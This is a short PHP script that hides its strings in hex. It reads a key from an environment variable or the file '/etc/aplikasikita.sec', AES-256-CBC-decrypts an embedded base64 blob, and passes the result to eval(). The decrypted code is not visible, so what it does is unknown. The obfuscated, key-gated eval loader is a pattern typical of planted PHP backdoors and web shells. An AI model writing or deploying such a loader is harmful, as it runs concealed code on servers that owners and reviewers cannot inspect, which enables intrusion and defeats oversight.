<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DaauDD2G/6kZZbGXKGjwIg==');

$c=base64_decode(

'xyP4n0ACjQBVS6SHt8+En42mcvS6lkTazvHh4RVKMppUj/4E8Ay/I9oNGlY8+WBm8SnwMW0ThtFS' .
'm/IEIXZdJXK4V6OjH/dI5yAL9ycMKetGaGE3mDEHGOXz3gioGs7d7/YrJzNbeHvgl0ZTHoinK14u' .
'PAg6g6dnXKK2M3CkqBb2yAYKp7fLTO5QahbNeZq2TGpbIf06pBvoExFwv8S27mlnTiPp7EE/B15G' .
'YcifcUcp8tymCHjBv1/p4nU4DajTzapxvwosD4LAPV+/fuYz8deuu6f+Hgml20Nl0KMOxIIMoxVd' .
'esvvHhOoRppY4yOtxOT8s3d5Pi7eiHwDnVOEwD+SpaLs6jAuZhzUhNwU9e7sC6KOeTC+bOi+VQQo' .
'Z3nOwaq2lNnLJTFsofPkC0JylV6Jik+00h7RyPIJHuHi723pmCL2gfDK0Xll4k59b/bddanUZAQe' .
'rwHB9Mc7eXNSSxGVLWtEQng6zLVjyERSVlrrraaIr8qRZ1942YZvw1IsMkvXNkghvjV4+uXaFsqf' .
'qN8Bk/a0BMrdDuEwyhJLy5E='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

